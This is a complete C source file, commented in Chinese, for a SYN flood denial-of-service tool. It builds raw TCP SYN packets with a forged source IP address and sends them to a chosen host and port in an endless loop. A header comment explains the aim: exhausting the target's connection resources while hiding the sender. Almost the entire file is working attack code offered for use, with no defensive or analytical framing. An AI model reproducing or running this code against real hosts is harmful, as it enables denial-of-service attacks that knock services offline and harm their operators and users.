
/* simple syn flooder !!! */ 
#include <sys/types.h> 
#include <unistd.h> 
#include <errno.h> 
#include <signal.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <linux/ip.h> 
#include <linux/tcp.h> 
#include<string.h>
#include <stdio.h> 
#include <stdlib.h> 


unsigned short in_cksum(unsigned short *ptr,int nbytes); //校验和 
int synflooding();           // synflooder攻击程序
void sigint(int signo);      //捕捉信息
struct sockaddr_in target;   // 目标的socket地址结构体
struct sockaddr_in pesudo;   // 伪装的socket地址结构体
int rawsock; 
/*
攻击原理：TCP连接需要进行确认回复才能连接，这里就针对这个确认回复进行攻击。用通俗的话讲，就是拒绝服务攻击（DDoS），该攻击利用TCP/IP协议天生的特点，通过大量的虚假IP地址建立不完整连接，使得服务器超载，陷入瘫痪状态。
过程是这样的，向目标主机发送一个TCP包 就是向目标主机请求连接，但是不进行回复确认，这样
每发起一个连接，目标主机就会新建一个连接并等待确认，就是连接列表越来越大，并且都是还没有回复确认的--
这样就会耗尽目标主机资源---
所以程序实现就是循环的向目标主机发起连接请求包，为了不被发现，会问伪装为别的ip进行发送。这样目标主机就不会察觉是谁发的包了。
*/

int main(int argc, char *argv[]) 
{ 
		// 参数是否完整  程序 伪装ip 目标ip 目标端口
        if( argc != 4) { 
                printf("usage:%s pesudoip attackip attackport\n", argv[0]); 
                exit(1); 
        } 
		// 用伪装ip初始化伪装socket地址
        if( inet_aton(argv[1], &pesudo.sin_addr) == 0) { 
                printf("bad ip address:%s\n", argv[1]); 
                exit(1); 
        } 
		// 用目标ip初始化目标socket地址
        if( inet_aton(argv[2], &target.sin_addr) == 0) { 
                printf("bad ip address:%s\n", argv[2]); 
                exit(1); 
        } 
		// 目标端口初始化
        target.sin_port=htons(atoi(argv[3])); 
        signal(SIGINT, sigint);   // 捕捉信息
        synflooding();   //开始攻击
        exit(0); 
} 

// synflooder攻击程序
int synflooding() 
{ 
        int i, j, k; 
        struct packet{   // 数据包结构体 包括ip头部 tcp头部
			struct iphdr ip;    // ip地址
			struct tcphdr tcp;  // tcp头部
        }packet; 

		//伪装头部　用于TCP校验和的伪头
        struct pseudo_header{           /* For TCP header checksum */ 
                unsigned int source_address;  // 源地址
                unsigned int dest_address;  // 目的地址
                unsigned char placeholder;   
                unsigned char protocol; 
                unsigned short tcp_length; 
                struct tcphdr tcp; 
        }pseudo_header; 
        bzero(&packet, sizeof(packet));   // 初始化包
        bzero(&pseudo_header, sizeof(pseudo_header)); // 初始化伪头
		// 产生raw 套接字 原始套接字  原始套接字却可以访问传输层以下的数据
        if((rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) { 
		perror("socket()"); 
		exit(1); 
		} 
	packet.tcp.dest=target.sin_port; /*tcp头部初始化 目标ip地址 */ 
	packet.tcp.ack_seq=0; /*tcp头部初始化 ACK序列号 */ 
	packet.tcp.doff=5; /* 数据偏移量 */ 
	packet.tcp.res1=0; /* 保留位 */ 
	packet.tcp.urg=0; /* 紧急指针有效 */ 
	packet.tcp.ack=0; /* 为0表示不包含ack确认信息 */ 
	packet.tcp.psh=0; /* 标识是否立即提交数据 */ 
	packet.tcp.rst=0; /* 重置位 */ 
	packet.tcp.syn=1; /* 同步序号 */ 
	packet.tcp.fin=0; /* 完成位标识 */ 
	packet.tcp.window=htons(242); /* 滑动窗口大小 */ 
	packet.tcp.urg_ptr=0; /* 这个域被用来指示紧急数据在当前数据段中的位置，它是一个相对于当前序列号的字节偏移值。 */ 
	packet.ip.version=4; /* ipv4 */ 
	packet.ip.ihl=5; /*ip包头部长度 */ 
	packet.ip.tos=0; /* 服务位 */ 
	packet.ip.tot_len=htons(40); /* ip数据包总长度*/ 
	packet.ip.id=getpid(); /* 数据包标识*/ 
	packet.ip.frag_off=0; /* 包偏移量 */ 
	packet.ip.ttl=255; /* 包的生命周期 */ 
	packet.ip.protocol=IPPROTO_TCP; /* 传输层使用TCP 协议 */ 
	packet.ip.check=0; /* 首部校验和 */ 
	packet.ip.saddr=pesudo.sin_addr.s_addr; /* 源ip地址*/ 
	packet.ip.daddr=target.sin_addr.s_addr; /* 目标ip地址*/ 

	packet.ip.check=in_cksum((unsigned short *)  &packet.ip,20); // 计算包首部的校验和
	while(1) {  //循环攻击 循环发送伪包
		/* set src port and ISN */ 
		packet.tcp.source=htons(1025+rand()%60000); //随机产生一个TCP端口号
		packet.tcp.seq=761013+rand()%100000;  //随机产生一个报文段中的起始字节数
		packet.tcp.check=0; 

		pseudo_header.source_address=packet.ip.saddr; // 源ip地址
		pseudo_header.dest_address=packet.ip.daddr;   //目的ip地址
		pseudo_header.placeholder=0; 
		pseudo_header.protocol=IPPROTO_TCP;   //TCP协议
		pseudo_header.tcp_length=htons(20); 	//TCP长度

		bcopy((char *)&packet.tcp,(char *)&pseudo_header.tcp,20);  //用这个伪头 初始化TCP头部
		packet.tcp.check=in_cksum((unsigned short *)&pseudo_header,32); //计算伪头校验和
		sendto(rawsock,&packet,40,0, (struct sockaddr *)&target,sizeof(target));   // 发送包
		printf("sendind...\n");
	} 
	return 0; 
}

// 计算校验和 
unsigned short in_cksum(unsigned short *addr, int len) 
{ 
        int sum=0; 
        unsigned short res=0; 
        while( len > 1)  { 
                sum += *addr++; 
                len -=2; 
        } 
        if( len == 1) { 
                *((unsigned char *)(&res))=*((unsigned char *)addr); 
                sum += res; 
        } 
        sum = (sum >>16) + (sum & 0xffff); 
        sum += (sum >>16) ; 
        res = ~sum; 
        return res; 
} 

// 捕捉信号 linux信号
void sigint(int signo) 
{ 
        printf("catch SIGINT\n"); 
        close(rawsock); 
        exit(0); 
} 